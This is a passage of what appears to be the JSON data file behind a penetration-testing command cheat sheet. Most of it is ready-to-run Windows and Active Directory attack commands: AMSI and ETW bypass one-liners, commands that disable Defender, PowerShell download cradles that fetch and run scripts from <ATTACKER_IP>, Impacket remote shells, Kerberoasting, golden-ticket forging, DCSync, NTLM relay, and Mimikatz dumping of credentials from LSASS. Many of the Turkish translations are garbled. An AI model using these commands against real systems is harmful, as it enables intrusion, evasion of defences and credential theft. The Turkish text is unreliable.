            "title": "Evil-WinRM Bypass AMSI (In-Session)",
            "desc": "Bypass AMSI to run tools without AV detection",
            "cmd": "Bypass-4MSI",
            "tags": [
              "essential"
            ],
            "note": "Run inside evil-winrm session — run before loading any tool",
            "desc_tr": "AMSI bypass — AV tespiti olmadan araç çalıştırmak için"
          },
          {
            "title": "Evil-WinRM Load DLL (In-Session)",
            "desc": "Load a DLL into memory on the target",
            "cmd": "Dll-Loader -http http://<ATTACKER_IP>/payload.dll",
            "tags": [
              "advanced"
            ],
            "note": "Run inside evil-winrm session",
            "desc_tr": "Hedef üzerinde DLL'i belleğe yükle"
          },
          {
            "title": "Evil-WinRM .NET Assembly (In-Session)",
            "desc": "Execute .NET assembly (exe) in memory using Invoke-Binary",
            "cmds": [
              "# Start evil-winrm with -e flag pointing to exe folder:",
              "# evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -e /path/to/exe/",
              "Bypass-4MSI",
              "Invoke-Binary /path/to/exe/Rubeus.exe kerberoast"
            ],
            "tags": [
              "essential"
            ],
            "note": "Run inside evil-winrm session — requires -e flag on connect",
            "desc_tr": ".NET assembly (exe) bellek içinde çalıştır"
          },
          {
            "title": "Evil-WinRM Load PS Script (In-Session)",
            "desc": "Load PowerShell script into session and invoke function",
            "cmds": [
              "# Start evil-winrm with -s flag pointing to script folder:",
              "# evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -s /path/to/scripts/",
              "Bypass-4MSI",
              "PowerView.ps1",
              "Get-DomainUser -Identity <USER>"
            ],
            "tags": [
              "essential"
            ],
            "note": "Run inside evil-winrm session — requires -s flag on connect. Type script name to load, then call functions",
            "desc_tr": "PS script'i session'a yükle ve fonksiyonları çağır"
          },
          {
            "title": "Evil-WinRM Services (In-Session)",
            "desc": "List Windows services from session",
            "cmd": "services",
            "tags": [
              "essential"
            ],
            "note": "Run inside evil-winrm session",
            "desc_tr": "Windows servislerini listele"
          },
          {
            "title": "Evil-WinRM Post-Connect Recon (In-Session)",
            "desc": "Initial reconnaissance commands after Evil-WinRM connection",
            "cmds": [
              "whoami /all",
              "hostname",
              "ipconfig /all",
              "net user",
              "net localgroup Administrators",
              "systeminfo"
            ],
            "tags": [
              "essential"
            ],
            "note": "Run inside evil-winrm session",
            "desc_tr": "Evil-WinRM bağlantısından sonra ilk keşif komutları"
          },
          {
            "title": "Evil-WinRM WinPEAS from Session",
            "desc": "Upload and run WinPEAS for privilege escalation enumeration",
            "cmds": [
              "upload /path/to/winPEASx64.exe C:\\Windows\\Temp\\winPEASx64.exe",
              "C:\\Windows\\Temp\\winPEASx64.exe"
            ],
            "tags": [
              "essential"
            ],
            "note": "Run inside evil-winrm session",
            "desc_tr": "WinPEAS yükle ve çalıştır (yetki yükseltme keşfi)"
          },
          {
            "title": "Evil-WinRM SharpHound from Session",
            "desc": "Upload and run SharpHound for BloodHound collection",
            "cmds": [
              "upload /path/to/SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe",
              "C:\\Windows\\Temp\\SharpHound.exe -c All",
              "download C:\\Windows\\Temp\\*_BloodHound.zip /local/path/"
            ],
            "tags": [
              "essential"
            ],
            "note": "Run inside evil-winrm session",
            "desc_tr": "SharpHound yükle ve çalıştır (BloodHound veri toplama)"
          }
        ],
        "name_tr": "WinRM (5985/5986)"
      }
    ],
    "name_tr": "Ağ Servisi İstismarı",
    "description_tr": "Service-specific exploitation techniques for common ports found during OSCP-style engagements."
  },
  {
    "id": "powershell-pentest",
    "name": "PowerShell for Pentesters",
    "icon": "⚡",
    "description": "PowerShell commands for Active Directory enumeration, exploitation, and post-exploitation using PowerView, PowerUp, and native cmdlets.",
    "subcategories": [
      {
        "name": "PowerShell Basics & Execution",
        "commands": [
          {
            "title": "Bypass ExecutionPolicy",
            "desc": "Bypass PowerShell execution policy",
            "cmd": "powershell -ep bypass",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: PowerShell executipolicy üzerinde"
          },
          {
            "title": "PowerShell Download Cradle",
            "desc": "Download and execute script in memory",
            "cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/<SCRIPT>.ps1')\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "İndir: and execute script memory içinde"
          },
          {
            "title": "PowerShell EncodedCommand",
            "desc": "Execute base64 encoded command",
            "cmd": "powershell -ep bypass -enc <BASE64_CMD>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: base64 encoded command"
          },
          {
            "title": "Encode PS Command (Linux)",
            "desc": "Encode PowerShell command to base64",
            "cmd": "echo -n \"<PS_COMMAND>\" | iconv -t UTF-16LE | base64 -w 0",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kodla: a PowerShell command base64'e"
          },
          {
            "title": "PowerShell Invoke-Expression",
            "desc": "Execute string as command",
            "cmd": "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/script.ps1')",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: string as command"
          },
          {
            "title": "PowerShell Download File",
            "desc": "Download file to disk",
            "cmd": "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>/file.exe' -OutFile 'C:\\Temp\\file.exe'",
            "tags": [
              "essential"
            ],
            "desc_tr": "İndir: file disk'e"
          },
          {
            "title": "PowerShell Check Language Mode",
            "desc": "Check if in constrained language mode",
            "cmd": "$ExecutionContext.SessionState.LanguageMode",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: if constrained language mode içinde"
          },
          {
            "title": "PowerShell Version",
            "desc": "Check PowerShell version",
            "cmd": "$PSVersionTable.PSVersion",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: PowerShell version"
          },
          {
            "title": "Disable AMSI (Reflection)",
            "desc": "Disable AMSI via reflection",
            "cmd": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Devre dışı bırak: AMSI reflectiüzerinden üzerinde"
          }
        ],
        "name_tr": "PowerShell Basics & Execution"
      },
      {
        "name": "PowerView — AD Enumeration",
        "commands": [
          {
            "title": "Import PowerView",
            "desc": "Load PowerView into memory",
            "cmd": "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerView.ps1')",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Yükle: PowerView inmemory'e"
          },
          {
            "title": "Get Domain Info",
            "desc": "Get domain information",
            "cmd": "Get-Domain",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: domainformation içinde"
          },
          {
            "title": "Get Domain Controller",
            "desc": "List domain controllers",
            "cmd": "Get-DomainController",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: domacontrollers içinde"
          },
          {
            "title": "Get All Domain Users",
            "desc": "Enumerate all domain users",
            "cmd": "Get-DomainUser | select samaccountname,description,memberof",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm etki alanı kullanıcıları"
          },
          {
            "title": "Get User Description",
            "desc": "Find passwords in user descriptions",
            "cmd": "Get-DomainUser | Where-Object {$_.description -ne $null} | select samaccountname,description",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: passwords user descriptions içinde"
          },
          {
            "title": "Get Domain Groups",
            "desc": "List all domain groups",
            "cmd": "Get-DomainGroup | select name",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm etki alanı grupları"
          },
          {
            "title": "Get Domain Admin Members",
            "desc": "List Domain Admin group members",
            "cmd": "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | select MemberName",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: DomaAdmin grup üyelikleri içinde"
          },
          {
            "title": "Get Domain Computers",
            "desc": "List all domain computers",
            "cmd": "Get-DomainComputer | select name,operatingsystem",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm etki alanı bilgisayarları"
          },
          {
            "title": "Find Local Admins",
            "desc": "Find local admin rights for current user",
            "cmd": "Find-LocalAdminAccess",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: yerel yönetici rights for mevcut user"
          },
          {
            "title": "Get Logged On Users",
            "desc": "Get logged on users across domain",
            "cmd": "Get-NetLoggedon -ComputerName <COMPUTER>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Al: logged users domaüzerinde içinde genelinde"
          },
          {
            "title": "Get Domain Trusts",
            "desc": "Enumerate domain trusts",
            "cmd": "Get-DomainTrust",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: etki alanı güven ilişkileri"
          },
          {
            "title": "Get Forest Trusts",
            "desc": "Enumerate forest trusts",
            "cmd": "Get-ForestTrust",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: forest trusts"
          },
          {
            "title": "Find Interesting Files",
            "desc": "Search for sensitive files on shares",
            "cmd": "Find-InterestingDomainShareFile -Include *.txt,*.pdf,*.xls,*.doc,*.ps1,*.bat",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Ara: for hassas dosyalar shares üzerinde"
          },
          {
            "title": "Get SPNs (Kerberoast)",
            "desc": "Find all service principal names",
            "cmd": "Get-DomainUser -SPN | select samaccountname,serviceprincipalname",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: tüm service principal names"
          },
          {
            "title": "Invoke-Kerberoast",
            "desc": "Kerberoast all SPNs and output hashes",
            "cmd": "Invoke-Kerberoast | fl",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kerberoast tüm SPNs and output hashes"
          },
          {
            "title": "Get ASREPRoast Targets",
            "desc": "Find accounts with pre-auth disabled",
            "cmd": "Get-DomainUser -PreauthNotRequired | select samaccountname",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: accounts pre-auth disabled ile"
          },
          {
            "title": "Get ACL Rights",
            "desc": "Find ACL rights for a specific user",
            "cmd": "Get-DomainObjectAcl -Identity '<USER>' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|WriteProperty|WriteDacl'}",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Bul: ACL rights for a belirli user"
          },
          {
            "title": "Find ObjectAcl Write Paths",
            "desc": "Find write/modify rights across all objects",
            "cmd": "Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match '<USER>'}",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Bul: write/modify rights tüm objects genelinde"
          },
          {
            "title": "Unconstrained Delegation",
            "desc": "Find computers with unconstrained delegation",
            "cmd": "Get-DomainComputer -Unconstrained | select name",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: computers sınırsız delegasyile üzerinde"
          },
          {
            "title": "Constrained Delegation",
            "desc": "Find accounts with constrained delegation",
            "cmd": "Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: accounts kısıtlı delegasyile üzerinde"
          }
        ],
        "name_tr": "PowerView — AD Enumeration"
      },
      {
        "name": "PowerUp — Privilege Escalation",
        "commands": [
          {
            "title": "Import PowerUp",
            "desc": "Load PowerUp into memory",
            "cmd": "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1')",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Yükle: PowerUp inmemory'e"
          },
          {
            "title": "Invoke-AllChecks",
            "desc": "Run all PowerUp privilege escalation checks",
            "cmd": "Invoke-AllChecks",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: tüm PowerUp yetki yükseltme checks"
          },
          {
            "title": "Get-ServiceUnquoted",
            "desc": "Find services with unquoted paths",
            "cmd": "Get-ServiceUnquoted | select ServiceName,PathName",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: services unquoted paths ile"
          },
          {
            "title": "Get-ModifiableService",
            "desc": "Find services current user can modify",
            "cmd": "Get-ModifiableService | select ServiceName",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: services mevcut user can modify"
          },
          {
            "title": "Get-ModifiableServiceFile",
            "desc": "Find services with writable binaries",
            "cmd": "Get-ModifiableServiceFile | select ServiceName,ModifiablePath",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: services writable binaries ile"
          },
          {
            "title": "Invoke-ServiceAbuse",
            "desc": "Abuse modifiable service to add local admin",
            "cmd": "Invoke-ServiceAbuse -ServiceName '<SERVICE>' -UserName '<DOMAIN>\\<USER>'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Kötüye kullan: modifiable service add yerel yönetici'e"
          },
          {
            "title": "Write-ServiceBinary",
            "desc": "Replace service binary with custom payload",
            "cmd": "Write-ServiceBinary -ServiceName '<SERVICE>' -Path C:\\Temp\\payload.exe",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Değiştir: service binary özel payload ile"
          },
          {
            "title": "Get AlwaysInstallElevated",
            "desc": "Check AlwaysInstallElevated registry key",
            "cmd": "Get-RegistryAlwaysInstallElevated",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: AlwaysInstallElevated registry key"
          },
          {
            "title": "Get-UnattendedInstallFiles",
            "desc": "Find unattended installation files with creds",
            "cmd": "Get-UnattendedInstallFile",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: unattended installatifiles creds ile üzerinde"
          },
          {
            "title": "Get-CachedGPPPassword",
            "desc": "Find cached GPP passwords",
            "cmd": "Get-CachedGPPPassword",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: cached GPP passwords"
          }
        ],
        "name_tr": "PowerUp — Privilege Escalation"
      },
      {
        "name": "AMSI & Defense Bypass",
        "commands": [
          {
            "title": "AMSI Bypass - Matt Graeber",
            "desc": "Classic AMSI bypass via reflection",
            "cmd": "[System.Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null), 1)",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Classic AMSI bypass reflectiüzerinden üzerinde"
          },
          {
            "title": "AMSI Bypass - Patching",
            "desc": "Patch AMSI.dll in memory",
            "cmd": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true)",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yamala: AMSI.dll memory içinde"
          },
          {
            "title": "Disable Windows Defender (Admin)",
            "desc": "Disable Defender real-time protection",
            "cmd": "Set-MpPreference -DisableRealtimeMonitoring $true",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Devre dışı bırak: Defender real-time protection"
          },
          {
            "title": "Add Defender Exclusion",
            "desc": "Add path to Defender exclusion list",
            "cmd": "Add-MpPreference -ExclusionPath 'C:\\Temp'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Ekle: path Defender exclusilist üzerinde'e"
          },
          {
            "title": "ETW Bypass",
            "desc": "Disable ETW logging for current PS process",
            "cmd": "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Devre dışı bırak: ETW logging for mevcut PS process"
          }
        ],
        "name_tr": "AMSI & Defense Bypass"
      },
      {
        "name": "Active Directory Module (Native)",
        "commands": [
          {
            "title": "Import AD Module",
            "desc": "Import Active Directory PowerShell module",
            "cmd": "Import-Module ActiveDirectory",
            "tags": [
              "essential"
            ],
            "desc_tr": "İçe aktar: Active Directory PowerShell module"
          },
          {
            "title": "Get-ADUser All",
            "desc": "List all AD users",
            "cmd": "Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm AD users"
          },
          {
            "title": "Get-ADGroup Members",
            "desc": "List members of a group",
            "cmd": "Get-ADGroupMember -Identity 'Domain Admins' -Recursive | select Name",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: members of a group"
          },
          {
            "title": "Get-ADComputer All",
            "desc": "List all domain computers",
            "cmd": "Get-ADComputer -Filter * -Properties * | select Name,OperatingSystem,IPv4Address",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm etki alanı bilgisayarları"
          },
          {
            "title": "Get-ADDomainController",
            "desc": "List domain controllers",
            "cmd": "Get-ADDomainController -Filter *",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: domacontrollers içinde"
          },
          {
            "title": "Get-ADTrust",
            "desc": "List domain trusts",
            "cmd": "Get-ADTrust -Filter *",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: etki alanı güven ilişkileri"
          },
          {
            "title": "Set-ADAccountPassword",
            "desc": "Reset user password (if rights allow)",
            "cmd": "Set-ADAccountPassword -Identity <USER> -Reset -NewPassword (ConvertTo-SecureString '<NEW_PASS>' -AsPlainText -Force)",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Sıfırla: user password (if rights allow)"
          }
        ],
        "name_tr": "Active Directory Module (Native)"
      }
    ],
    "name_tr": "Pentesterlar için PowerShell",
    "description_tr": "PowerShell commands for Active Directory enumeration, exploitation, and post-exploitation using PowerView, PowerUp, and native cmdlets."
  },
  {
    "id": "impacket-suite",
    "name": "Impacket Toolsuite",
    "icon": "🐍",
    "description": "Comprehensive Impacket tools for Windows/AD protocol attacks, credential dumping, and lateral movement.",
    "subcategories": [
      {
        "name": "Remote Execution",
        "commands": [
          {
            "title": "PsExec Remote Shell",
            "desc": "Get SYSTEM shell via SMB",
            "cmd": "psexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Al: SYSTEM shell SMB üzerinden"
          },
          {
            "title": "PsExec with Hash",
            "desc": "PsExec using NTLM hash",
            "cmd": "psexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "PsExec NTLM hash kullanarak"
          },
          {
            "title": "WMIExec Remote Shell",
            "desc": "Get shell via WMI (semi-interactive)",
            "cmd": "wmiexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Al: shell WMI (semi-interactive) üzerinden"
          },
          {
            "title": "WMIExec with Hash",
            "desc": "WMIExec using NTLM hash",
            "cmd": "wmiexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "WMIExec NTLM hash kullanarak"
          },
          {
            "title": "SMBExec Remote Shell",
            "desc": "Get SYSTEM shell via SMB service creation",
            "cmd": "smbexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Al: SYSTEM shell SMB service creatiüzerinden üzerinde"
          },
          {
            "title": "AtExec Command",
            "desc": "Execute command via Task Scheduler",
            "cmd": "atexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP> 'whoami'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: command Task Scheduler üzerinden"
          },
          {
            "title": "DCOMExec Remote Shell",
            "desc": "Execute via DCOM (MMC20)",
            "cmd": "dcomexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çalıştır: DCOM (MMC20) üzerinden"
          }
        ],
        "name_tr": "Remote Execution"
      },
      {
        "name": "Kerberos Attacks",
        "commands": [
          {
            "title": "GetUserSPNs (Kerberoast)",
            "desc": "Get TGS tickets for Kerberoasting",
            "cmd": "GetUserSPNs.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Al: TGS tickets for Kerberoasting"
          },
          {
            "title": "GetUserSPNs with Hash",
            "desc": "Kerberoast using NTLM hash",
            "cmd": "GetUserSPNs.py -hashes :<NTLM_HASH> <DOMAIN>/<USER> -dc-ip <DC_IP> -request",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kerberoast NTLM hash kullanarak"
          },
          {
            "title": "GetNPUsers (ASREPRoast)",
            "desc": "Get AS-REP hashes for roasting",
            "cmd": "GetNPUsers.py <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP> -format hashcat",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Al: AS-REP hashes for roasting"
          },
          {
            "title": "GetNPUsers Single User",
            "desc": "AS-REP roast a specific user",
            "cmd": "GetNPUsers.py <DOMAIN>/<USER> -no-pass -dc-ip <DC_IP> -format hashcat",
            "tags": [
              "essential"
            ],
            "desc_tr": "AS-REP roast a belirli user"
          },
          {
            "title": "getTGT Get Ticket",
            "desc": "Get TGT for a user",
            "cmd": "getTGT.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Al: TGT for a user"
          },
          {
            "title": "getST S4U (Delegation)",
            "desc": "Get service ticket via S4U2Self/S4U2Proxy",
            "cmd": "getST.py -spn <SERVICE>/<TARGET> -impersonate administrator <DOMAIN>/<USER>:'<PASS>'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Al: service ticket S4U2Self/S4U2Proxy üzerinden"
          },
          {
            "title": "Ticketer Silver Ticket",
            "desc": "Forge silver ticket",
            "cmd": "ticketer.py -nthash <SERVICE_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE>/<TARGET> administrator",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Sahte oluştur: silver ticket"
          },
          {
            "title": "Ticketer Golden Ticket",
            "desc": "Forge golden ticket with krbtgt hash",
            "cmd": "ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> administrator",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Sahte oluştur: golden ticket krbtgt hash ile"
          },
          {
            "title": "Use Kerberos Ticket",
            "desc": "Export ticket for use with Impacket",
            "cmd": "export KRB5CCNAME=administrator.ccache",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dışa aktar: ticket ile kullanmak içImpacket içinde"
          }
        ],
        "name_tr": "Kerberos Attacks"
      },
      {
        "name": "Credential Dumping",
        "commands": [
          {
            "title": "SecretsDump Remote SAM",
            "desc": "Dump SAM and LSA secrets remotely",
            "cmd": "secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Dökümle: SAM and LSA secrets remotely"
          },
          {
            "title": "SecretsDump with Hash",
            "desc": "Dump secrets using NTLM hash",
            "cmd": "secretsdump.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: secrets NTLM hash kullanarak"
          },
          {
            "title": "SecretsDump DCSync",
            "desc": "DCSync to get all domain hashes",
            "cmd": "secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc-ntlm",
            "tags": [
              "essential"
            ],
            "desc_tr": "DCSync get tüm domahashes'e içinde"
          },
          {
            "title": "SecretsDump Just NTLM",
            "desc": "Get only NTLM hashes from DC",
            "cmd": "secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc-ntlm -outputfile hashes.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: only NTLM hashes DC üzerinden"
          },
          {
            "title": "SecretsDump from NTDS",
            "desc": "Dump from copied NTDS.dit file",
            "cmd": "secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Dökümle: copied NTDS.dit file üzerinden"
          }
        ],
        "name_tr": "Credential Dumping"
      },
      {
        "name": "Network Attacks",
        "commands": [
          {
            "title": "NTLM Relay Setup",
            "desc": "Relay NTLM auth to execute commands",
            "cmd": "ntlmrelayx.py -t smb://<TARGET_IP> -smb2support",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Yönlendir: NTLM auth execute commands'e"
          },
          {
            "title": "NTLM Relay Interactive Shell",
            "desc": "Get interactive SMB shell via relay",
            "cmd": "ntlmrelayx.py -t smb://<TARGET_IP> -smb2support -i",
            "tags": [
              "tool"
            ],
            "desc_tr": "Al: interactive SMB shell relay üzerinden"
          },
          {
            "title": "NTLM Relay Execute Command",
            "desc": "Execute command via relay",
            "cmd": "ntlmrelayx.py -t smb://<TARGET_IP> -smb2support -c 'whoami'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: command relay üzerinden"
          },
          {
            "title": "NTLM Relay to LDAP (DA)",
            "desc": "Relay to LDAP to add user to DA",
            "cmd": "ntlmrelayx.py -t ldaps://<DC_IP> --delegate-access -smb2support",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yönlendir: LDAP to add user to DA'e"
          },
          {
            "title": "NTLM Relay MultiRelay",
            "desc": "Relay to multiple targets from list",
            "cmd": "ntlmrelayx.py -tf targets.txt -smb2support",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yönlendir: multiple targets list üzerinden'e"
          },
          {
            "title": "Responder Start",
            "desc": "Start Responder to capture NTLM hashes",
            "cmd": "sudo responder -I <INTERFACE> -wPv",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Başlat: Responder capture NTLM hashes'e"
          },
          {
            "title": "Responder without SMB/HTTP",
            "desc": "Run Responder while ntlmrelayx is active",
            "cmd": "sudo responder -I <INTERFACE> -wd",
            "tags": [
              "essential"
            ],
            "note": "Disable SMB and HTTP in /etc/responder/Responder.conf first",
            "desc_tr": "Çalıştır: Responder while ntlmrelayx is active"
          },
          {
            "title": "Mitm6 IPv6 Poisoning",
            "desc": "IPv6 DNS takeover for NTLM capture",
            "cmd": "sudo mitm6 -d <DOMAIN>",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "IPv6 DNS takeover for NTLM capture"
          }
        ],
        "name_tr": "Network Attacks"
      },
      {
        "name": "LDAP / AD Tools",
        "commands": [
          {
            "title": "FindDelegation",
            "desc": "Find delegation configurations",
            "cmd": "findDelegation.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Bul: delegaticonfigurations üzerinde"
          },
          {
            "title": "GetADUsers",
            "desc": "Enumerate AD users",
            "cmd": "GetADUsers.py -all <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: AD users"
          },
          {
            "title": "Lookupsid RID Brute",
            "desc": "Enumerate users via SID/RID brute force",
            "cmd": "lookupsid.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: users SID/RID kaba kuvvet saldırısı üzerinden"
          },
          {
            "title": "Samrdump User Enum",
            "desc": "Enumerate users via SAMR protocol",
            "cmd": "samrdump.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: users SAMR protocol üzerinden"
          },
          {
            "title": "Reg.py Registry Query",
            "desc": "Remote registry queries",
            "cmd": "reg.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP> query -keyName 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Uzaktan registry queries"
          }
        ],
        "name_tr": "LDAP / AD Tools"
      }
    ],
    "name_tr": "Impacket Araç Seti",
    "description_tr": "Comprehensive Impacket tools for Windows/AD protocol attacks, credential dumping, and lateral movement."
  },
  {
    "id": "mimikatz",
    "name": "Mimikatz Commands",
    "icon": "🐱",
    "description": "Mimikatz credential extraction, Kerberos ticket manipulation, and Windows credential attacks.",
    "subcategories": [
      {
        "name": "Credential Extraction",
        "commands": [
          {
            "title": "Privilege Debug",
            "desc": "Elevate to debug privilege (required for most modules)",
            "cmd": "privilege::debug",
            "tags": [
              "essential"
            ],
            "desc_tr": "Elevate debug privilege (required for most modules)'e"
          },
          {
            "title": "Sekurlsa LogonPasswords",
            "desc": "Dump cleartext passwords and NTLM hashes from LSASS",
            "cmd": "sekurlsa::logonpasswords",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: açık metpasswords and NTLM hashes LSASS üzerinden içinde"
          },
          {
            "title": "Sekurlsa WDIGEST",
            "desc": "Show WDigest credentials (cleartext if enabled)",
            "cmd": "sekurlsa::wdigest",
            "tags": [
              "tool"
            ],
            "desc_tr": "Göster: WDigest kimlik bilgileri (açık metif enabled) içinde"
          },
          {
            "title": "Sekurlsa MSVCACHE",
            "desc": "Dump cached domain credentials",
            "cmd": "sekurlsa::msv",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dökümle: önbelleğe alınmış kimlik bilgileri kimlik bilgileri"
          },
          {
            "title": "Sekurlsa Kerberos Tickets",
            "desc": "List Kerberos tickets in memory",
            "cmd": "sekurlsa::kerberos",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: Kerberos tickets memory içinde"
          },
          {
            "title": "Sekurlsa All Creds",
            "desc": "Dump all credential types at once",
            "cmd": "sekurlsa::logonpasswords full",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: tüm kimlik bilgileri types at once"
          },
          {
            "title": "Sekurlsa DPAPI Keys",
            "desc": "Extract DPAPI master keys",
            "cmd": "sekurlsa::dpapi",
